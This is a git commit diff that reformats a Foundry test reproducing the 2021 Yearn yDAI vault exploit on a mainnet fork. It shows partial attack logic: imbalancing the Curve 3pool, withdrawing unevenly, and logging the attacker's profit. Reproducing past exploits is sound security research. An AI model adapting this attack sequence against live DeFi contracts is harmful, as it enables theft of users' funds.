29153b9afa39882244bbc716170f002865126903
akshaynexus <akshaycm@hotmail.com>
2024-05-12 15:13:34 +0400

    fmt: forge fmt on yearn_ydai

--- src/test/others/Yearn_ydai.sol
+++ src/test/others/Yearn_ydai.sol
@@ -17,20 +17,19 @@ import "./../interface.sol";
 
 // @Analysis
 // Post-mortem : https://github.com/yearn/yearn-security/blob/master/disclosures/2021-02-04.md
-// Twitter Guy : https://www.google.com/
 
 interface ICurve {
     function add_liquidity(uint256[3] memory amounts, uint256 min_mint_amount) external;
     function remove_liquidity_imbalance(uint256[3] memory amounts, uint256 max_burn_amount) external;
-  function remove_liquidity(uint256 token_amount, uint256[3] memory min_amounts)
-  external
-  returns (uint256[3] memory);
+    function remove_liquidity(
+        uint256 token_amount,
+        uint256[3] memory min_amounts
+    ) external returns (uint256[3] memory);
     function get_virtual_price() external view returns (uint256 out);
-
 }
 
-interface IYVDai{
-    function balanceOf(address) external view returns (uint);
+interface IYVDai {
+    function balanceOf(address) external view returns (uint256);
     function deposit(uint256 _amount) external;
     function earn() external;
     function withdrawAll() external;
@@ -60,16 +59,12 @@ contract Exploit is Test {
     uint256 constant init_add_dai_amt = 37_972_761_178_915_525_047_091_200;
     uint256 constant init_add_usdc_amt = 133_000_000_000_000;
 
-    constructor() {
-        // Approvals and initialization logic goes here
-    }
-
     function writeTokenBalance(address who, address token, uint256 amt) internal {
         stdstore.target(token).sig(IERC20(token).balanceOf.selector).with_key(who).checked_write(amt);
     }
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 11792183);
+        vm.createSelectFork("mainnet", 11_792_183);
         uint256 max_earn_amt = 0;
         for (uint256 i = 0; i < earn_amt.length; i++) {
             if (earn_amt[i] > max_earn_amt) {
@@ -77,11 +72,11 @@ contract Exploit is Test {
             }
         }
         require(max_earn_amt > 0, "0 is max amt?");
-        
+
         //Initialize initial token balances
         writeTokenBalance(address(this), address(dai), init_add_dai_amt + max_earn_amt);
         writeTokenBalance(address(this), address(usdc), init_add_usdc_amt);
-        
+
         //Approvals
         dai.approve(address(yvdai), type(uint256).max);
         TransferHelper.safeApprove(address(usdt), address(curve), type(uint256).max);
@@ -93,9 +88,10 @@ contract Exploit is Test {
         // Construct the exploit logic here
         uint256 hacker_dai_amt_before = dai.balanceOf(address(this));
         uint256 hacker_usdc_amt_before = usdc.balanceOf(address(this));
-        require(usdt.balanceOf(address(this))==0,"has usdt");
-        require(crv3.balanceOf(address(this))==0,"has c3rv");
-        require(yvdai.balanceOf(address(this))==0,"has ydai");
+
+        require(usdt.balanceOf(address(this)) == 0, "has usdt");
+        require(crv3.balanceOf(address(this)) == 0, "has c3rv");
+        require(yvdai.balanceOf(address(this)) == 0, "has ydai");
 
         // First make the pool imbalanced
         curve.add_liquidity([init_add_dai_amt, init_add_usdc_amt, 0], 0);
@@ -119,15 +115,14 @@ contract Exploit is Test {
         // Convert some 3crv
         uint256 dai_difference = hacker_dai_amt_before - dai.balanceOf(address(this));
         curve.remove_liquidity_imbalance([dai_difference + 1, init_add_usdc_amt + 1, 0], max_3crv_amount);
-        require(dai.balanceOf(address(this)) == hacker_dai_amt_before+1,"incorrect dai bal after attack");
-        require(usdc.balanceOf(address(this)) == hacker_usdc_amt_before+1,"incorrect usdc amount after attack");
+        require(dai.balanceOf(address(this)) == hacker_dai_amt_before + 1, "incorrect dai bal after attack");
+        require(usdc.balanceOf(address(this)) == hacker_usdc_amt_before + 1, "incorrect usdc amount after attack");
 
         //Lets give back our initial funding to see real profit
-        writeTokenBalance(address(this), address(dai),dai.balanceOf(address(this))-  hacker_dai_amt_before);
+        writeTokenBalance(address(this), address(dai), dai.balanceOf(address(this)) - hacker_dai_amt_before);
         writeTokenBalance(address(this), address(usdc), usdc.balanceOf(address(this)) - hacker_usdc_amt_before);
         //This is attacker profit, Only does one run to show it
-        console.log("Attacker get 3crv amt: %d", crv3.balanceOf(address(this))/1e18);
-        console.log("Attacker get usdt amt: %d", usdt.balanceOf(address(this))/1e6);
-
+        console.log("Attacker get 3crv amt: %d", crv3.balanceOf(address(this)) / 1e18);
+        console.log("Attacker get usdt amt: %d", usdt.balanceOf(address(this)) / 1e6);
     }
 }
